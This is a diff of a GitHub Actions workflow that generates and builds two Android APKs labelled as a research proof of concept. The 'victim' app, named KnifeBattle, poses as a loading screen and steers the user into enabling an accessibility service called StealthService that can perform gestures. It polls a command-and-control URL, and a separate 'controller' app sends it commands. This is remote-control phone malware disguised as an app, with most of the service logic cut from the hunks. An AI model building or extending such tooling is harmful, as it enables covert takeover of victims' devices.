@@ -1,4 +1,4 @@
-name: Create & Build PoC APKs - Max Stability
+name: Create & Build PoC APKs - Max Stability Fixed
 
 on:
   workflow_dispatch:
@@ -8,41 +8,34 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout (even empty repo)
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Create minimal Android project structure
+      - name: Generate Android project
         run: |
-          echo "=== Starting project creation ==="
-
-          # settings.gradle
           cat > settings.gradle << 'END'
           rootProject.name = "PoC"
           include ':app'
           END
-          echo "settings.gradle created"
 
-          # build.gradle - project level (גרסה יציבה + repositories חובה!)
+          # build.gradle - project level - עם repositories בראש!
           cat > build.gradle << 'END'
           plugins {
-              id 'com.android.application' version '8.5.2' apply false
+              id 'com.android.application' version '8.5.0' apply false
           }
 
           repositories {
-              google()
+              google()          // חובה ראשון!
               mavenCentral()
           }
           END
-          echo "build.gradle (project) created"
 
-          # תיקיות
           mkdir -p app/src/main/java/com/research/lab/victim
           mkdir -p app/src/main/java/com/research/lab/controller
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/values
-          echo "Directories created"
 
-          # app/build.gradle
+          # app/build.gradle (השאר כמו קודם)
           cat > app/build.gradle << 'END'
           plugins {
               id 'com.android.application'
@@ -91,48 +84,37 @@ jobs:
               implementation 'androidx.core:core:1.13.1'
           }
           END
-          echo "app/build.gradle created"
 
           # AndroidManifest.xml
           cat > app/src/main/AndroidManifest.xml << 'END'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-
               <uses-permission android:name="android.permission.INTERNET" />
-
               <application android:allowBackup="false" android:label="PoC">
-
                   <activity android:name=".victim.jhome$LoadingActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-
                   <service android:name=".victim.jhome$StealthService"
                       android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                       android:exported="true">
                       <intent-filter>
                           <action android:name="android.accessibilityservice.AccessibilityService" />
                       </intent-filter>
-                      <meta-data
-                          android:name="android.accessibilityservice"
-                          android:resource="@xml/accessibility_config" />
+                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config" />
                   </service>
-
                   <activity android:name=".controller.manager" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-
               </application>
           </manifest>
           END
-          echo "AndroidManifest.xml created"
 
-          # accessibility_config.xml
           cat > app/src/main/res/xml/accessibility_config.xml << 'END'
           <?xml version="1.0" encoding="utf-8"?>
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
@@ -142,18 +124,15 @@ jobs:
               android:canPerformGestures="true"
               android:description="@string/accessibility_desc" />
           END
-          echo "accessibility_config.xml created"
 
-          # strings.xml
           cat > app/src/main/res/values/strings.xml << 'END'
           <resources>
               <string name="app_name">PoC</string>
               <string name="accessibility_desc">Research PoC Accessibility Service</string>
           </resources>
           END
-          echo "strings.xml created"
 
-          # jhome.java (Victim - נשלט)
+          # jhome.java (Victim)
           cat > app/src/main/java/com/research/lab/victim/jhome.java << 'END'
           package com.research.lab.victim;
 
@@ -178,7 +157,6 @@ jobs:
           import org.json.JSONObject;
 
           public class jhome {
-
               private static final String TAG = "KnifeBattle";
               private static final String C2_URL = "http://192.168.1.100:8000/cmd";
 
@@ -207,9 +185,7 @@ jobs:
                           btn.setVisibility(View.VISIBLE);
                       }, 3000);
 
-                      btn.setOnClickListener(v -> 
-                          startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                      );
+                      btn.setOnClickListener(v -> startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)));
                   }
               }
 
@@ -270,9 +246,7 @@ jobs:
               }
           }
           END
-          echo "jhome.java created"
 
-          # manager.java (Controller)
           cat > app/src/main/java/com/research/lab/controller/manager.java << 'END'
           package com.research.lab.controller;
 
@@ -347,27 +321,25 @@ jobs:
               }
           }
           END
-          echo "manager.java created"
 
-      - name: Setup JDK 17 (Temurin - most reliable)
+      - name: Setup JDK 17
         uses: actions/setup-java@v4
         with:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Setup Gradle (stable LTS version)
+      - name: Setup Gradle
         uses: gradle/actions/setup-gradle@v4
         with:
           gradle-version: 8.10.2
 
-      - name: Build knife-battle APK (Victim)
+      - name: Build knife-battle APK
         run: gradle assembleVictimDebug
 
-      - name: Build remote-control APK (Controller)
+      - name: Build remote-control APK
         run: gradle assembleControllerDebug
 
       - name: Upload APKs
-        if: always()
         uses: actions/upload-artifact@v4
         with:
           name: poc-apks
